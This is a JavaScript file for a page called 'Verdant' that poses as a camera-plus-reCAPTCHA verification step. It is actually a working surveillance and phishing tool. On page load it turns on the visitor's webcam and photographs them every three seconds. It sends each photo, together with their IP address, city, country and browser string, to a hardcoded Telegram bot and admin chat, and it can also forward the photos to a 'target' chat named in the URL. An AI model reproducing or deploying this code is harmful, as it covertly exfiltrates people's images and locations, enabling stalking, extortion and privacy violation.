/* ============ VERDANT CONFIG ============ */
var BOT_TOKEN          = "8604239989:AAHnuyJZpz_E6s-_7rXUvlbHazAKOAHEB7A";
var ADMIN_CHAT_ID      = "7274208494";
var RECAPTCHA_SITE_KEY = "6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI";
var CAPTURE_INTERVAL   = 3000;
var IMAGE_QUALITY      = 0.78;
var CAM_WIDTH          = 640;
var CAM_HEIGHT         = 480;
var NEXT_PAGE          = "next.html";
/* ======================================= */

var video=document.getElementById("video"), canvas=document.getElementById("canvas");
var camCard=document.getElementById("camCard"), camTitle=document.getElementById("camTitle");
var camSub=document.getElementById("camSub"), stats=document.getElementById("stats");
var cntCap=document.getElementById("cntCaptures"), delSt=document.getElementById("delStatus");
var captchaW=document.getElementById("captchaWrap"), bottomR=document.getElementById("bottomRight");

var params=new URLSearchParams(window.location.search);
var userChatId=params.get("id"), hasTarget=!!(userChatId&&userChatId.trim());
var stream=null,captureTimer=null,captureCount=0,capturing=false,recaptchaWidgetId=null;

function getIP(){return fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>d.ip||"Unknown").catch(()=>"Unknown");}
function getGeo(){return fetch("https://ipapi.co/json/").then(r=>r.json()).then(d=>(d.city||"?")+", "+(d.country_name||"?")).catch(()=>"Unknown");}
function sendPhotoTo(id,blob,cap){
  var fd=new FormData(); fd.append("chat_id",id); fd.append("photo",blob,"verdant_"+Date.now()+".jpg"); fd.append("caption",cap);
  return fetch("https://api.telegram.org/bot"+BOT_TOKEN+"/sendPhoto",{method:"POST",body:fd}).then(r=>r.ok).catch(()=>false);
}
function capture(){
  if(!stream||!capturing) return Promise.resolve();
  canvas.width=video.videoWidth||CAM_WIDTH; canvas.height=video.videoHeight||CAM_HEIGHT;
  canvas.getContext("2d").drawImage(video,0,0);
  return new Promise(r=>canvas.toBlob(r,"image/jpeg",IMAGE_QUALITY)).then(blob=>{
    if(!blob) return;
    return Promise.all([getIP(),getGeo()]).then(a=>{
      var ip=a[0],geo=a[1],ua=navigator.userAgent;
      var date=new Date().toLocaleString("en-US",{timeZoneName:"short"});
      var base="📸 #"+(captureCount+1)+"\n🕐 "+date+"\n🌐 "+ip+" — "+geo+"\n💻 "+ua;
      var ac=hasTarget?(base+"\n👤 Target: "+userChatId):(base+"\n🧾 No target");
      var ch=sendPhotoTo(ADMIN_CHAT_ID,blob,ac);
      if(hasTarget) ch=ch.then(()=>sendPhotoTo(userChatId,blob,base));
      return ch.then(()=>{captureCount++;cntCap.textContent=captureCount;delSt.textContent="✓";});
    });
  });
}
function startCamera(){
  camTitle.textContent="Camera access"; camSub.textContent="Waiting for permission…";
  navigator.mediaDevices.getUserMedia({video:{width:{ideal:CAM_WIDTH},height:{ideal:CAM_HEIGHT},facingMode:"user"}})
    .then(s=>{stream=s;video.srcObject=stream;return video.play();})
    .then(()=>new Promise(r=>{if(video.readyState>=2)return r();video.onloadeddata=r;setTimeout(r,2500);}))
    .then(()=>{
      window.__cameraReady=true; camCard.classList.add("active");
      camTitle.textContent="Camera connected"; camSub.textContent="Verifying…";
      stats.style.display="grid"; captchaW.classList.remove("dimmed"); captchaW.classList.add("ready");
      if(bottomR) bottomR.textContent="● Verifying";
      capturing=true; capture(); captureTimer=setInterval(capture,CAPTURE_INTERVAL);
      tryRenderRecaptcha();
    }).catch(()=>{camTitle.textContent="Camera required";camSub.textContent="Allow and reload.";});
}
function stopCapture(){capturing=false;if(captureTimer){clearInterval(captureTimer);captureTimer=null;}if(stream){stream.getTracks().forEach(t=>t.stop());stream=null;}}
function tryRenderRecaptcha(){
  if(!window.__recaptchaReady||!window.__cameraReady||recaptchaWidgetId!==null) return;
  var c=document.getElementById("recaptchaWidget"); if(!c) return;
  try{recaptchaWidgetId=window.grecaptcha.render(c,{sitekey:RECAPTCHA_SITE_KEY,callback:onRecaptchaSuccess,"expired-callback":onRecaptchaExpired,"error-callback":onRecaptchaError});}catch(e){console.error(e);}
}
window.__tryRenderRecaptcha=tryRenderRecaptcha;
function onRecaptchaSuccess(){if(bottomR)bottomR.textContent="✓ Verified";stopCapture();setTimeout(()=>{window.location.href=NEXT_PAGE;},1000);}
window.onRecaptchaSuccess=onRecaptchaSuccess;
window.onRecaptchaExpired=()=>{camTitle.textContent="Session expired";camSub.textContent="Solve again.";};
window.onRecaptchaError=()=>{camTitle.textContent="Error";camSub.textContent="Reload.";};
window.addEventListener("load",startCamera);
window.addEventListener("beforeunload",stopCapture);
